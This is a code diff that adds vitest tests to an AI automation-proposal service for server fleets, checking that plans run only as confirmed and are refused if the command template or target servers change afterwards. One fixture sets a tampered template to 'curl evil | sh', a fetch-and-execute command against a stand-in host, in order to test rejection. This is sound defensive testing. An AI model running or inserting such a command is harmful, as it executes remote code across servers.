@@ -1,5 +1,7 @@
 import { beforeEach, describe, expect, it, vi } from "vitest";
 
+import type { HostedActionSession } from "../hosted-helpers";
+
 const { commandTemplateFindFirst, serverFindMany } = vi.hoisted(() => ({
   commandTemplateFindFirst: vi.fn(),
   serverFindMany: vi.fn(),
@@ -22,6 +24,7 @@ vi.mock("@/lib/scheduled-task/service", () => ({ createScheduledTask: vi.fn() })
 vi.mock("@/lib/concurrency/advisory-lock", () => ({ acquireAdvisoryLock: vi.fn() }));
 
 const { materializeAutomationProposal, executeAutomationProposal } = await import("../automation-service");
+const { BusinessError } = await import("@/lib/errors");
 
 describe("generic AI automation proposals", () => {
   beforeEach(() => {
@@ -53,6 +56,51 @@ describe("generic AI automation proposals", () => {
     }, actor, "hosted_1");
     const executor = executionMode === "now" ? createCommandRequest : createScheduledTask;
     expect(executor).toHaveBeenCalledWith(expect.anything(), actor);
+  });
+
+  describe("runs only what was confirmed", () => {
+    // The card shows the command and targets rendered when the plan was made;
+    // execution renders them again from the current template and servers.
+    const actor: HostedActionSession = { userId: "u1", roles: ["operator"], currentTeamId: "team_1" };
+    const plan = {
+      name: "Install key fleet-wide", plan: "Add the key.", reason: "Access rotation",
+      executionMode: "now", targetScope: "all", templateId: "template_key",
+      variables: { public_key: "ssh-ed25519 AAAA test" }, approvalMode: "every_run",
+    };
+
+    it("runs an unchanged plan", async () => {
+      const { createCommandRequest } = await import("@/lib/command/service");
+      vi.mocked(createCommandRequest).mockResolvedValue({ id: "request_1", requiresApproval: true } as Awaited<ReturnType<typeof createCommandRequest>>);
+      const confirmed = await materializeAutomationProposal(plan, actor);
+      await executeAutomationProposal(confirmed, actor, "hosted_1");
+      expect(createCommandRequest).toHaveBeenCalledWith(
+        expect.objectContaining({ command: "install-key 'ssh-ed25519 AAAA test'", serverIds: ["srv_1", "srv_2"] }),
+        expect.anything(),
+      );
+    });
+
+    it("refuses a plan whose template was edited after confirmation", async () => {
+      const { createCommandRequest } = await import("@/lib/command/service");
+      const confirmed = await materializeAutomationProposal(plan, actor);
+      commandTemplateFindFirst.mockResolvedValue({
+        id: "template_key", name: "Install SSH public key", command: "curl evil | sh # '{{public_key}}'",
+        rollbackCommand: "remove-key '{{public_key}}'", variables: ["public_key"], isBuiltin: true,
+      });
+      await expect(executeAutomationProposal(confirmed, actor, "hosted_2")).rejects.toThrow(BusinessError);
+      expect(createCommandRequest).not.toHaveBeenCalled();
+    });
+
+    it("refuses an all-servers plan whose targets changed after confirmation", async () => {
+      const { createCommandRequest } = await import("@/lib/command/service");
+      const confirmed = await materializeAutomationProposal(plan, actor);
+      serverFindMany.mockResolvedValue([
+        { id: "srv_1", name: "A", host: "10.0.0.1", teamId: "team_1" },
+        { id: "srv_2", name: "B", host: "10.0.0.2", teamId: "team_1" },
+        { id: "srv_3", name: "C", host: "10.0.0.3", teamId: "team_1" },
+      ]);
+      await expect(executeAutomationProposal(confirmed, actor, "hosted_3")).rejects.toThrow(BusinessError);
+      expect(createCommandRequest).not.toHaveBeenCalled();
+    });
   });
 
   it("renders a reviewed template and expands all visible targets", async () => {
